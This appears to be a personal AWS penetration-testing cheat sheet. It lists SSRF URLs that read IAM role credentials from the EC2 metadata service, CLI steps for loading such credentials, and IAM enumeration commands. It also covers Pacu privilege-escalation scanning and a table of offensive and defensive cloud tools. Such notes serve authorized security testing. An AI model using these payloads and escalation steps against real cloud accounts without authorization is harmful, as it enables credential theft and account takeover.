---
layout: notes
permalink: /notes/cloud/aws/
title: AWS Pentesting Notes
---

# AWS Pentesting Notes

### SSRF
```
curl http://169.254.169.254/latest/meta-data/

http://169.254.169.254/latest/user-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/iam/security-credentials/<ROLE NAME>
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/
```

Configuring the access with Long-Term credentials:
```bash
aws configure —profile atomic-nuclear
```
> ⚠️ Note: If the Access Key start with AKIA* - that belongs to LONG-TERM credentials

Get information about configured identity
```bash
aws sts get-caller-identity —profile atomic-nuclear
```
Configuring the access with Short-Term credentials:
```bash
aws configure
```
> ⚠️ Note: If the Access Key start with ASIA* - that belongs to SHORT-TERM credentials

### AWS credentials path
Windows
> ![image.png](/assets/images/aws-5.png)

Linux
> ![image.png](/assets/images/aws-6.png)

### Configure aws cli
```
aws configure set aws_access_key_id [key-id] --profile ec2
aws configure set aws_secret_access_key [key-id] --profile ec2
aws configure set aws_session_token [token] --profile ec2
aws sts get-caller-identity --profile ec2
```

## Enumeration

### Users

List Users
```bash
aws iam list-users
```
List Groups
```bash
aws iam list-groups
```
List the IAM groups that the specified IAM user belongs to
```bash
aws iam list-groups-for-user --user-name [user-name]
```
List all manages policies that are attached to the specified IAM user :
```bash
aws iam list-attached-user-policies --user-name [user-name]
```
Lists the names of the inline policies embedded in the specified IAM user :
```bash
aws iam list-user-policies --user-name [user-name]
```
### GROUPS

List of IAM Groups :
```bash
aws iam list-groups
```
List of all users in a groups :
```bash
aws iam get-group --group-name [group-name]
```
Lists all managed policies that are attached to the specified IAM Group :
```bash
aws iam list-attached-group-policies --group-name [group-name]
```
List the names of the inline policies embedded in the specified IAM Group:
```bash
aws iam list-group-policies --group-name [group-name]
```
### ROLES

List of IAM Roles :
```bash
aws iam list-roles
```
Lists all managed policies that are attached to the specified IAM role :
```bash
aws iam list-attached-role-policies --role-name [ role-name]
```
List the names of the inline policies embedded in the specified IAM role :
```bash
aws iam list-role-policies --role-name [ role-name]
```
### POLICIES

List of all iam policies :
```bash
aws iam list-policies
```
Retrieves information about the specified managed policy :
```bash
aws iam get-policy --policy-arn [policy-arn]
```
Lists information about the versions of the specified manages policy :
```bash
aws iam list-policy-versions --policy-arn [policy-arn]
```
Retrieved information about the specified version of the specified managed policy : 
```bash
aws iam get-policy-version --policy-arn policy-arn --version-id [version-id]
```
Retrieves the specified inline policy document that is embedded on the specified IAM user / group / role :
```bash
aws iam get-user-policy --user-name user-name --policy-name [policy-name]
aws iam get-group-policy --group-name group-name --policy-name [policy-name]
aws iam get-role-policy --role-name role-name --policy-name [policy-name]
```

## References and more techniques
[Hacking the Cloud](https://hackingthe.cloud/)

## Automated Tools

### Pacu

Setting the initial user access key in pacu 
```bash
set_keys
```
Get the permission of current logged-in user 
```bash
exec iam__enum_permissions
whoami
```
Enumerate ec2 instance and get the public ip addresses.
```bash
exec ec2__enum
data EC2
#The results will show another public IP addresses, we can perform another SSRF/RCE attack to retrieve another’s AWS Credentials as above.
```
Set the temporary credential for role attached to ec2 instance.
```bash
set_keys
```
Get the permission of current logged-in role.
```bash
exec iam__enum_permissions
whoami
```
Enumerate privilege escalation permission and exploit it. 
```bash
exec iam__privesc_scan
```
Again, check the permission of privilege escalated role.
```bash
exec iam__enum_permissions
whoami
```

### Cloud Enum

```bash
cloud_enum -k 'CompanyName'
```

## Other tools

| [cloudfox](https://github.com/BishopFox/cloudfox)|- Find exploitable attack paths in cloud infrastructure|
| [WeirdAAL](https://github.com/carnal0wnage/weirdAAL) |- AWS Attack Library|
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) |- AWS penetration testing toolkit|
| [Cred Scanner](https://github.com/disruptops/cred_scanner) |- A simple file-based scanner to look for potential AWS access and secret keys in files|
| [AWS PWN](https://github.com/dagrz/aws_pwn) |- A collection of AWS penetration testing tools|
| [Cloudfrunt](https://github.com/MindPointGroup/cloudfrunt) |- A tool for identifying misconfigured CloudFront domains|
| [Cloudjack](https://github.com/prevade/cloudjack) |- Route53/CloudFront Vulnerability Assessment Utility|
| [Nimbostratus](https://github.com/andresriancho/nimbostratus) |- Tools for fingerprinting and exploiting Amazon cloud infrastructures|
| [GitLeaks](https://github.com/zricethezav/gitleaks) |- Audit git repos for secrets|
| [TruffleHog](https://github.com/dxa4481/truffleHog) |- Searches through git repositories for high entropy strings and secrets, digging deep into history|
| [DumpsterDiver](https://github.com/securing/DumpsterDiver) |- Tool to search secrets in various filetypes (e.g., AWS Access Key, Azure Share Key, SSH keys, passwords)|
| [Mad-King](https://github.com/ThreatResponse/mad-king) |- Proof of Concept Zappa Based AWS Persistence and Attack Platform|
| [Cloud-Nuke](https://github.com/gruntwork-io/cloud-nuke) |- A tool for cleaning up cloud accounts by deleting all resources|
| [MozDef](https://github.com/mozilla/MozDef) |- Automates security incident handling and facilitates real-time incident response|
| [Lambda-Proxy](https://github.com/puresec/lambda-proxy) |- Bridge between SQLMap and AWS Lambda to test for SQL Injection vulnerabilities|
| [CloudCopy](https://github.com/Static-Flow/CloudCopy) |- Cloud version of Shadow Copy attack against domain controllers in AWS using EC2:CreateSnapshot|
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) |- Enumerate permissions associated with AWS credential sets|
| [Barq](https://github.com/Voulnet/barq) |- Post-exploitation framework for attacking running AWS infrastructure|
| [CCAT](https://github.com/RhinoSecurityLabs/ccat) |- Cloud Container Attack Tool for testing container environment security|
| [Dufflebag](https://github.com/bishopfox/dufflebag) |- Search exposed EBS volumes for secrets|
| [attack_range](https://github.com/splunk/attack_range) |- Create vulnerable, instrumented local or cloud environments for attack simulation and Splunk data|
| [whispers](https://github.com/Skyscanner/whispers) |- Identify hardcoded secrets and dangerous behaviors in code|
| [Redboto](https://github.com/elitest/Redboto) |- Red Team AWS scripts|
| [CloudBrute](https://github.com/0xsha/cloudbrute) |- Tool to find company infrastructure, files, and apps on top cloud providers|